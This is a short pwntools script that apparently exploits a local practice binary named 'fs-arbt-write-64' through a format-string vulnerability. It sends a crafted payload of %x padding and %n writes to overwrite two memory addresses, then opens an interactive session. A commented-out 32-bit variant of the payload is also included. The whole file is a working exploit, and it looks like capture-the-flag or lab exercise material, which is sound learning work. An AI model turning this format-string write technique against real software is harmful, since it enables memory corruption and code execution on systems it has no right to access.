from pwn import *

env = {'PATH' : '.:/bin:/usr/bin'}

# Launch processs
p = process('./fs-arbt-write-64', env=env)

inp = '%45068x%10$n%19138x%11$n\0\0\0\0\0\0\0\0\x8c\x10\x60\0\0\0\0\0\x8e\x10\x60\0\0\0\0\0'
#inp = '\x48\xa0\x04\x08\x4a\xa0\x04\x08%45060x%7$n%19138x%8$n'

# Read 8 bytes
print(p.recvline())
p.sendline(inp)

data = p.recvline()
print(data.split())
p.interactive()
